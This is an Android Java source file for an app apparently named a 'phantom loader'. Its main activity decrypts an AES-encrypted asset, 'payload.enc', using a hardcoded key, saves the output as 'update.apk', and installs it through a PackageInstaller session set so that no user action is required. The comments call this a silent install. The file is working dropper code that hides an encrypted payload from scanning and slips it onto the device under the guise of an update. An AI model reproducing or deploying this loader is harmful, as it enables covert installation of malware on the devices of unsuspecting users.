package com.phantom.loader;

import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static final String KEY = "S3cr3tK3yPh4nt0m2025!@#";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("Sistema Pronto. Instalando...");
        layout.addView(tv);

        Button btn = new Button(this);
        btn.setText("Iniciar");
        btn.setOnClickListener(v -> instalar());
        layout.addView(btn);
        setContentView(layout);
    }

    private void instalar() {
        new Thread(() -> {
            try {
                // 1. Lê o APK criptografado do assets
                InputStream is = getAssets().open("payload.enc");
                byte[] encData = new byte[is.available()];
                is.read(encData);
                is.close();

                // 2. Descriptografa o APK inteiro
                MessageDigest sha = MessageDigest.getInstance("SHA-256");
                byte[] key = sha.digest(KEY.getBytes());
                SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, keySpec);
                byte[] decData = cipher.doFinal(encData);

                // 3. Salva o APK limpo no cache
                File file = new File(getCacheDir(), "update.apk");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decData);
                fos.close();

                // 4. Instala via Sessão (Silencioso)
                PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                }

                int sessionId = packageInstaller.createSession(params);
                PackageInstaller.Session session = packageInstaller.openSession(sessionId);

                OutputStream out = session.openWrite("package", 0, -1);
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) != -1) { out.write(buffer, 0, len); }
                session.fsync(out);
                fis.close();
                out.close();

                Intent intent = new Intent(this, InstallReceiver.class);
                PendingIntent pi = PendingIntent.getBroadcast(this, sessionId, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
                session.commit(pi.getIntentSender());
                session.close();

                runOnUiThread(() -> Toast.makeText(this, "Instalando...", Toast.LENGTH_SHORT).show());

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
